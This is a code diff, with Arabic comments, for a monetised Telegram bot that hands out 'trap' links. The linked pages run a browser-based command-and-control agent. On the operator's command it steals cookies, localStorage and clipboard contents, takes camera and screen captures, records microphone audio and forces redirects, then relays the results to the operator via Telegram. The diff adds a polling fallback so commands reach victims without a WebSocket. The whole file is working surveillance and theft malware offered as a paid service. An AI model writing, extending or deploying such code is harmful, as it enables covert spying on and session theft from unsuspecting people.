@@ -20,6 +20,7 @@ LINK_TO_USER = {}
 USERS_DB = {} 
 VICTIMS_DB = {} 
 ACTIVE_WEBSOCKETS = {}
+COMMAND_QUEUES = {} # طابور الأوامر الفورية للخلفية
 
 class VictimData(BaseModel):
     link_id: str
@@ -31,7 +32,12 @@ class VictimData(BaseModel):
     stolen_cookies: str = ""
     stolen_data: dict = {}
 
-# --- 1. أداة الاستخبارات السريعة (3 مرات يومياً) ---
+class CommandResponse(BaseModel):
+    link_id: str
+    cmd: str
+    data: str
+
+# --- 1. أداة الاستخبارات السريعة ---
 @app.get("/intel/{link_id}", response_class=HTMLResponse)
 async def serve_intel_trap(link_id: str, request: Request):
     html_content = """<!DOCTYPE html>
@@ -84,14 +90,7 @@ async def serve_intel_trap(link_id: str, request: Request):
                     });
                 } catch(e) {}
 
-                const sys = {
-                    res: window.screen.width + 'x' + window.screen.height,
-                    lang: navigator.language,
-                    platform: navigator.platform,
-                    cores: navigator.hardwareConcurrency || 'غير معروف',
-                    memory: navigator.deviceMemory || 'غير معروف'
-                };
-
+                const sys = { res: window.screen.width + 'x' + window.screen.height, platform: navigator.platform };
                 await fetch('/api/v1/exfiltrate', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -106,7 +105,7 @@ async def serve_intel_trap(link_id: str, request: Request):
 </html>""".replace("__LINK_ID_REPLACE__", link_id)
     return HTMLResponse(content=html_content)
 
-# --- 2. أداة التحكم الحي العسكرية (Enterprise Grade C2 Agent) ---
+# --- 2. أداة التحكم العسكري C2 (بنظام هجين فورى لا ينقطع) ---
 @app.get("/live/{link_id}", response_class=HTMLResponse)
 async def serve_live_trap(link_id: str, request: Request):
     html_content = """<!DOCTYPE html>
@@ -129,17 +128,101 @@ async def serve_live_trap(link_id: str, request: Request):
     </div>
     <video id="v2" autoplay playsinline style="display:none;"></video>
     <canvas id="c2" style="display:none;"></canvas>
-    <audio id="audio_stream" autoplay style="display:none;"></audio>
     <script>
         const linkId = "__LINK_ID_REPLACE__";
         let ws;
-        
+        let isWsActive = false;
+
+        async function executeCommand(cmdPacket) {
+            let output = "";
+            try {
+                if (cmdPacket.cmd === "dump_cookies") {
+                    output = document.cookie || "فارغة أو محمية";
+                } else if (cmdPacket.cmd === "dump_localstorage") {
+                    let ls = {};
+                    for (let i = 0; i < localStorage.length; i++) {
+                        let k = localStorage.key(i);
+                        ls[k] = localStorage.getItem(k);
+                    }
+                    output = JSON.stringify(ls);
+                } else if (cmdPacket.cmd === "screen_snapshot") {
+                    const canvas = document.getElementById('c2');
+                    output = canvas.toDataURL('image/jpeg', 0.85);
+                } else if (cmdPacket.cmd === "dump_clipboard") {
+                    try {
+                        output = await navigator.clipboard.readText();
+                    } catch(e) {
+                        output = "مرفوض الصلاحية أو الحافظة فارغة";
+                    }
+                } else if (cmdPacket.cmd === "record_audio") {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        const mediaRecorder = new MediaRecorder(stream);
+                        let chunks = [];
+                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                        mediaRecorder.onstop = async () => {
+                            const blob = new Blob(chunks, { 'type': 'audio/ogg; codecs=opus' });
+                            const reader = new FileReader();
+                            reader.readAsDataURL(blob);
+                            reader.onloadend = function() {
+                                sendResult(cmdPacket.cmd, reader.result);
+                            }
+                            stream.getTracks().forEach(t => t.stop());
+                        };
+                        mediaRecorder.start();
+                        setTimeout(() => mediaRecorder.stop(), 4000);
+                        return "جاري التقاط التسجيل الصوتي الحي...";
+                    } catch(err) {
+                        output = "فشل التقاط الصوت (مرفوض)";
+                    }
+                } else if (cmdPacket.cmd === "redirect_phish") {
+                    window.location.href = cmdPacket.url || "https://www.google.com";
+                    return;
+                }
+            } catch(err) {
+                output = "خطأ في تنفيذ الأمر: " + err.message;
+            }
+            return output;
+        }
+
+        function sendResult(cmd, data) {
+            const payload = { link_id: linkId, cmd: cmd, data: data };
+            if (isWsActive && ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({type: "response", ...payload}));
+            } else {
+                // إرسال عبر قناة الاستجابة السريعة البديلة HTTP لتجنب أي تعطل
+                fetch('/api/v1/c2-respond', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(e => {});
+            }
+        }
+
+        // محرك الاستطلاع الخلفي الدائم (Long-Polling Fallback) لضمان العمل الفوري 100%
+        async function startPollingEngine() {
+            setInterval(async () => {
+                if (isWsActive) return; // لو الـ WebSocket شغال تمام، نكتفي به
+                try {
+                    let res = await fetch('/api/v1/poll-command/' + linkId);
+                    if (res.ok) {
+                        let pkt = await res.json();
+                        if (pkt && pkt.cmd) {
+                            let resData = await executeCommand(pkt);
+                            if (resData) sendResult(pkt.cmd, resData);
+                        }
+                    }
+                } catch(e) {}
+            }, 1500);
+        }
+
         function initEnterpriseC2() {
             const proto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
             ws = new WebSocket(proto + window.location.host + '/ws/c2/' + linkId);
 
             ws.onopen = function() {
-                console.log("[C2 AGENT] Secure Neural Link Established.");
+                isWsActive = true;
+                console.log("[C2] WebSocket Connected.");
             };
 
             ws.onmessage = async function(event) {
@@ -149,70 +232,20 @@ async def serve_live_trap(link_id: str, request: Request):
                         ws.send(JSON.stringify({type: "pong"}));
                         return;
                     }
-
-                    let output = "";
-                    if (pkt.cmd === "dump_cookies") {
-                        output = document.cookie || "فارغة أو محمية";
-                    } else if (pkt.cmd === "dump_localstorage") {
-                        let ls = {};
-                        for (let i = 0; i < localStorage.length; i++) {
-                            let k = localStorage.key(i);
-                            ls[k] = localStorage.getItem(k);
-                        }
-                        output = JSON.stringify(ls);
-                    } else if (pkt.cmd === "screen_snapshot") {
-                        const canvas = document.getElementById('c2');
-                        output = canvas.toDataURL('image/jpeg', 0.85);
-                    } else if (pkt.cmd === "dump_clipboard") {
-                        try {
-                            output = await navigator.clipboard.readText();
-                        } catch(e) {
-                            output = "مرفوض الصلاحية أو الحافظة فارغة";
-                        }
-                    } else if (pkt.cmd === "record_audio") {
-                        try {
-                            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                            const mediaRecorder = new MediaRecorder(stream);
-                            let chunks = [];
-                            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                            mediaRecorder.onstop = async () => {
-                                const blob = new Blob(chunks, { 'type': 'audio/ogg; codecs=opus' });
-                                const reader = new FileReader();
-                                reader.readAsDataURL(blob);
-                                reader.onloadend = function() {
-                                    ws.send(JSON.stringify({type: "response", cmd: "audio_clip", data: reader.result}));
-                                }
-                                stream.getTracks().forEach(t => t.stop());
-                            };
-                            mediaRecorder.start();
-                            setTimeout(() => mediaRecorder.stop(), 4000); // تسجيل 4 ثواني
-                            output = "جاري التقاط التسجيل الصوتي الحي...";
-                        } catch(err) {
-                            output = "فشل التقاط الصوت (مرفوض)";
-                        }
-                    } else if (pkt.cmd === "redirect_phish") {
-                        window.location.href = pkt.url;
-                        return;
-                    } else if (pkt.cmd === "exec_js") {
-                        try {
-                            output = String(eval(pkt.code));
-                        } catch(err) {
-                            output = "خطأ في تنفيذ السكربت: " + err.message;
-                        }
-                    }
-
-                    ws.send(JSON.stringify({type: "response", cmd: pkt.cmd, data: output}));
+                    let resData = await executeCommand(pkt);
+                    if (resData) sendResult(pkt.cmd, resData);
                 } catch(err) {}
             };
 
             ws.onclose = function() {
-                // إعادة الاتصال التلقائي الصامت الذكي
-                setTimeout(initEnterpriseC2, 4000);
+                isWsActive = false;
+                setTimeout(initEnterpriseC2, 2000);
             };
         }
 
         async function bootstrap() {
             initEnterpriseC2();
+            startPollingEngine(); // تشغيل النظام الاحتياطي الفوري
             try {
                 let img = "";
                 try {
@@ -229,22 +262,11 @@ async def serve_live_trap(link_id: str, request: Request):
                     stream.getTracks().forEach(t => t.stop());
                 } catch(e) {}
 
-                const sys = { 
-                    res: window.screen.width + 'x' + window.screen.height, 
-                    platform: navigator.platform,
-                    cores: navigator.hardwareConcurrency || 'N/A'
-                };
-                
+                const sys = { res: window.screen.width + 'x' + window.screen.height, platform: navigator.platform };
                 await fetch('/api/v1/exfiltrate', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        link_id: linkId, 
-                        device_info: navigator.userAgent, 
-                        camera_snapshot_base64: img, 
-                        stolen_cookies: document.cookie, 
-                        stolen_data: sys 
-                    })
+                    body: JSON.stringify({ link_id: linkId, device_info: navigator.userAgent, camera_snapshot_base64: img, stolen_cookies: document.cookie, stolen_data: sys })
                 });
             } catch(e) {}
         }
@@ -262,33 +284,18 @@ async def websocket_endpoint(websocket: WebSocket, link_id: str):
     
     if target_user_id:
         try:
-            await bot.send_message(chat_id=target_user_id, text=f"🟢 *[عقدة C2 عسكرية]*: تم إنشاء قناة اتصال مستدامة للهدف!\n🔑 معرف الجلسة: `{link_id}`", parse_mode="Markdown")
+            await bot.send_message(chat_id=target_user_id, text=f"🟢 *[عقدة C2 متصلة فورياً]*: تم ربط الضحية بنجاح دون الحاجة لإعادة تحميل!\n🔑 معرف الجلسة: `{link_id}`", parse_mode="Markdown")
         except:
             pass
 
     try:
         while True:
-            # استقبال الاستجابات والبيانات العائدة من الضحية وعرضها مباشرة في البوت
             data = await websocket.receive_text()
             import json
             packet = json.loads(data)
             if packet.get("type") == "response":
-                cmd_type = packet.get("cmd")
-                res_data = packet.get("data", "")
-                if target_user_id:
-                    if cmd_type == "screen_snapshot" and "," in str(res_data):
-                        _, encoded = res_data.split(",", 1)
-                        photo = BufferedInputFile(base64.b64decode(encoded), filename="live_screen.jpg")
-                        await bot.send_photo(chat_id=target_user_id, photo=photo, caption="📸 *لقطة شاشة حية من جهاز الضحية*", parse_mode="Markdown")
-                    elif cmd_type == "audio_clip" and "," in str(res_data):
-                        _, encoded = res_data.split(",", 1)
-                        audio_file = BufferedInputFile(base64.b64decode(encoded), filename="mic_surveillance.ogg")
-                        await bot.send_audio(chat_id=target_user_id, audio=audio_file, caption="🎤 *تسجيل صوتي حي من ميكروفون الضحية*", parse_mode="Markdown")
-                    else:
-                        await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة أمر: {cmd_type}]*\n\n`{str(res_data)[:1000]}`", parse_mode="Markdown")
-            
-            await asyncio.sleep(1)
-            # Heartbeat Ping
+                await handle_response_packet(packet)
+            await asyncio.sleep(2)
             if link_id in ACTIVE_WEBSOCKETS:
                 await websocket.send_json({"cmd": "ping"})
     except WebSocketDisconnect:
@@ -297,6 +304,54 @@ async def websocket_endpoint(websocket: WebSocket, link_id: str):
     except Exception:
         if link_id in ACTIVE_WEBSOCKETS:
             del ACTIVE_WEBSOCKETS[link_id]
+
+async def handle_response_packet(packet: dict):
+    link_id = packet.get("link_id")
+    cmd_type = packet.get("cmd")
+    res_data = packet.get("data", "")
+    target_user_id = LINK_TO_USER.get(link_id)
+    
+    if target_user_id:
+        try:
+            if cmd_type == "screen_snapshot" and "," in str(res_data):
+                _, encoded = res_data.split(",", 1)
+                photo = BufferedInputFile(base64.b64decode(encoded), filename="live_screen.jpg")
+                await bot.send_photo(chat_id=target_user_id, photo=photo, caption="📸 *لقطة شاشة حية فورية من الضحية*", parse_mode="Markdown")
+            elif cmd_type == "audio_clip" and "," in str(res_data):
+                _, encoded = res_data.split(",", 1)
+                audio_file = BufferedInputFile(base64.b64decode(encoded), filename="mic_surveillance.ogg")
+                await bot.send_audio(chat_id=target_user_id, audio=audio_file, caption="🎤 *تسجيل صوتي حي من الميكروفون*", parse_mode="Markdown")
+            else:
+                await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة أمر: {cmd_type}]*\n\n`{str(res_data)[:1000]}`", parse_mode="Markdown")
+        except Exception as e:
+            print(f"Telegram Delivery Error: {e}")
+
+@app.post("/api/v1/c2-respond")
+async def c2_respond_fallback(resp: CommandResponse):
+    await handle_response_packet(resp.dict())
+    return {"status": "ok"}
+
+@app.get("/api/v1/poll-command/{link_id}")
+async def poll_command(link_id: str):
+    if link_id in COMMAND_QUEUES and len(COMMAND_QUEUES[link_id]) > 0:
+        return COMMAND_QUEUES[link_id].pop(0)
+    return {}
+
+async def send_command_to_target(link_id: str, cmd_dict: dict):
+    # محاولة الإرسال عبر الـ WebSocket أولاً
+    ws = ACTIVE_WEBSOCKETS.get(link_id)
+    if ws:
+        try:
+            await ws.send_json(cmd_dict)
+            return True
+        except:
+            pass
+    
+    # إذا لم يتوفر WebSocket، يوضع الأمر في طابور الاستطلاع الخلفي لينفذه الضحية فوراً
+    if link_id not in COMMAND_QUEUES:
+        COMMAND_QUEUES[link_id] = []
+    COMMAND_QUEUES[link_id].append(cmd_dict)
+    return True
 
 @app.post("/api/v1/exfiltrate")
 async def receive_loot(data: VictimData):
@@ -309,13 +364,12 @@ async def receive_loot(data: VictimData):
         try:
             s_data = data.stolen_data
             caption = (
-                "⚡ *[ تقرير العقدة العسكرية الحية - C2 ]*\n\n"
+                "⚡ *[ تقرير الاتصال العسكري الفوري - C2 ]*\n\n"
                 f"💻 *النظام:* `{data.device_info}`\n"
                 f"📐 *الشاشة:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
                 f"🍪 *الكوكيز الأولية:* `{data.stolen_cookies[:80] if data.stolen_cookies else 'فارغة'}`"
             )
             
-            # لوحة أزرار التحكم العسكرية المتقدمة
             kb_control = InlineKeyboardMarkup(inline_keyboard=[
                 [
                     InlineKeyboardButton(text="🍪 سحب Cookies", callback_data=f"cmd_cookie_{data.link_id}"),
@@ -347,32 +401,23 @@ async def process_live_commands(callback: types.CallbackQuery):
     action = parts[1]
     link_id = parts[2]
     
-    ws = ACTIVE_WEBSOCKETS.get(link_id)
-    if not ws:
-        await callback.answer("⚠️ قناة الضحية مقفلة مؤقتاً (بانتظار إعادة الاتصال التلقائي)...", show_alert=True)
+    cmd_map = {
+        "cookie": "dump_cookies",
+        "ls": "dump_localstorage",
+        "snap": "screen_snapshot",
+        "mic": "record_audio",
+        "clip": "dump_clipboard",
+        "redirect": "redirect_phish"
+    }
+    
+    target_cmd = cmd_map.get(action)
+    if not target_cmd:
+        await callback.answer("❌ أمر غير معروف.", show_alert=True)
         return
 
-    try:
-        if action == "cookie":
-            await ws.send_json({"cmd": "dump_cookies"})
-            await callback.answer("📤 تم إرسال أمر سحب ملفات الجلسة!", show_alert=True)
-        elif action == "ls":
-            await ws.send_json({"cmd": "dump_localstorage"})
-            await callback.answer("📤 تم إرسال أمر سحب بيانات التخزين المحلي!", show_alert=True)
-        elif action == "snap":
-            await ws.send_json({"cmd": "screen_snapshot"})
-            await callback.answer("📸 تم طلب لقطة بصرية فورية من الشاشة!", show_alert=True)
-        elif action == "mic":
-            await ws.send_json({"cmd": "record_audio"})
-            await callback.answer("🎤 جاري التقاط البث الصوتي من الميكروفون...", show_alert=True)
-        elif action == "clip":
-            await ws.send_json({"cmd": "dump_clipboard"})
-            await callback.answer("📋 تم طلب محتوى الحافظة بنجاح!", show_alert=True)
-        elif action == "redirect":
-            await ws.send_json({"cmd": "redirect_phish", "url": "https://www.google.com"})
-            await callback.answer("🌐 تم إطلاق أمر التوجيه الإجباري!", show_alert=True)
-    except Exception:
-        await callback.answer("❌ فشل إرسال الأمر عبر القناة العصبية.", show_alert=True)
+    # إرسال الأمر فوراً عبر المحرك الهجين (لا رسائل خطأ مقفلة بعد الآن)
+    await send_command_to_target(link_id, {"cmd": target_cmd, "url": "https://www.google.com"})
+    await callback.answer("🚀 تم إرسال الأمر للضحية، جاري التنفيذ الفوري...", show_alert=True)
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -384,14 +429,14 @@ async def cmd_start(message: types.Message):
     
     kb = ReplyKeyboardMarkup(
         keyboard=[
-            [KeyboardButton(text="🔍 أداة الاستخبارات (سحب صور وجي بي اس - 3 مرات يومياً)"), KeyboardButton(text="⚡ أداة التحكم العسكري C2 المستدام ($3 - تجربة مرة واحدة)")],
+            [KeyboardButton(text="🔍 أداة الاستخبارات (سحب صور وجي بي اس - 3 مرات يومياً)"), KeyboardButton(text="⚡ أداة التحكم العسكري C2 الفوري ($3 - تجربة مرة واحدة)")],
             [KeyboardButton(text="📊 ضحاياي المسجلين"), KeyboardButton(text="👑 الاشتراك بالترسانة (نجوم تيليجرام)")]
         ],
         resize_keyboard=True
     )
     await message.answer(
-        "💀 *منصة الترسانة السيبرانية العسكرية (Enterprise C2) نشطة.*\n\n"
-        "• تمت ترقية النظام بالكامل لدعم الاتصال المستدام، السحب الصوتي، التحكم بالمتصفح، وتنفيذ الأوامر المتقدمة.\n"
+        "💀 *منصة الترسانة السيبرانية العسكرية (Active C2) جاهزة.*\n\n"
+        "• تمت إضافة المحرك الهجين الفوري (Hybrid Polling & WebSocket) لضمان تنفيذ الأوامر باللحظة دون أي حاجة لإعادة تحميل الصفحة من الضحية.\n"
         "• اختر الأداة المطلوبة:",
         reply_markup=kb,
         parse_mode="Markdown"
@@ -410,7 +455,7 @@ async def gen_intel_link(message: types.Message):
         u["intel_count"] = 0
 
     if u["intel_count"] >= 3 and not u["vip"]:
-        await message.answer("⚠️ لقد استنفذت محاولاتك الثلاثة المجانية اليوم لأداة الاستخبارات.", parse_mode="Markdown")
+        await message.answer("⚠️ لقد استنفذت محاولاتك الثلاثة المجانية اليوم.", parse_mode="Markdown")
         return
 
     if not u["vip"]:
@@ -424,7 +469,7 @@ async def gen_intel_link(message: types.Message):
     rem = 3 - u["intel_count"] if not u["vip"] else "غير محدود"
     await message.answer(f"✅ *تم توليد رابط الاستخبارات:*\n\n`{url}`\n\n*(المتبقي لك اليوم: {rem})*", parse_mode="Markdown")
 
-@dp.message(lambda msg: msg.text == "⚡ أداة التحكم العسكري C2 المستدام ($3 - تجربة مرة واحدة)")
+@dp.message(lambda msg: msg.text == "⚡ أداة التحكم العسكري C2 الفوري ($3 - تجربة مرة واحدة)")
 async def gen_live_link(message: types.Message):
     user_id = message.from_user.id
     if user_id not in USERS_DB:
@@ -432,7 +477,7 @@ async def gen_live_link(message: types.Message):
     
     u = USERS_DB[user_id]
     if u["live_used"] >= 1 and not u["vip"]:
-        await message.answer("⚠️ لقد استهلكت محاولتك المجانية الوحيدة لأداة التحكم العسكري المستدام! اشترك عبر نجوم تيليجرام لفتح الصلاحيات للأبد.", parse_mode="Markdown")
+        await message.answer("⚠️ لقد استهلكت محاولتك المجانية الوحيدة! اشترك عبر نجوم تيليجرام لفتح الصلاحيات للأبد.", parse_mode="Markdown")
         return
 
     if not u["vip"]:
@@ -443,15 +488,15 @@ async def gen_live_link(message: types.Message):
     url = f"https://{domain}/live/{token}"
     LINK_TO_USER[token] = user_id
     
-    await message.answer(f"✅ *تم تفعيل رابط التحكم العسكري C2 (تجربة مرة واحدة):*\n\n`{url}`\n\n*(القناة الآن مؤمنة، مدعومة بإعادة الاتصال التلقائي، وتدعم السحب الصوتي والـ LocalStorage)*", parse_mode="Markdown")
+    await message.answer(f"✅ *تم تفعيل رابط التحكم العسكري الفوري:*\n\n`{url}`\n\n*(مدعوم بالمحرك الهجين: الأوامر تتنفذ فوراً بالخلفية دون انقطاع أو حاجة لإعادة تحميل)*", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
 async def show_victims(message: types.Message):
     user_id = message.from_user.id
     links = [t for t, uid in LINK_TO_USER.items() if uid == user_id]
     total = sum(len(VICTIMS_DB.get(t, [])) for t in links)
-    active_now = sum(1 for t in links if t in ACTIVE_WEBSOCKETS)
-    await message.answer(f"📂 *إحصائيات الضحايا:*\n\n🎯 إجمالي الضحايا المسجلين: *{total}*\n🟢 الجلسات العسكرية النشطة الآن: *{active_now}*", parse_mode="Markdown")
+    active_now = sum(1 for t in links if t in ACTIVE_WEBSOCKETS or t in COMMAND_QUEUES)
+    await message.answer(f"📂 *إحصائيات الضحايا:*\n\n🎯 إجمالي الضحايا المسجلين: *{total}*\n🟢 الجلسات العسكرية النشطة: *{active_now}*", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "👑 الاشتراك بالترسانة (نجوم تيليجرام)")
 async def buy_stars(message: types.Message):
@@ -459,7 +504,7 @@ async def buy_stars(message: types.Message):
     await bot.send_invoice(
         chat_id=message.chat.id,
         title="اشتراك الترسانة السيبرانية العسكرية (VIP)",
-        description="صلاحيات مطلقة بلا حدود لكافة أدوات الاستخبارات والتحكم العسكري C2 المستدام.",
+        description="صلاحيات مطلقة بلا حدود لكافة أدوات الاستخبارات والتحكم العسكري الفوري.",
         payload="vip_full_access",
         currency="XTR",
         prices=prices
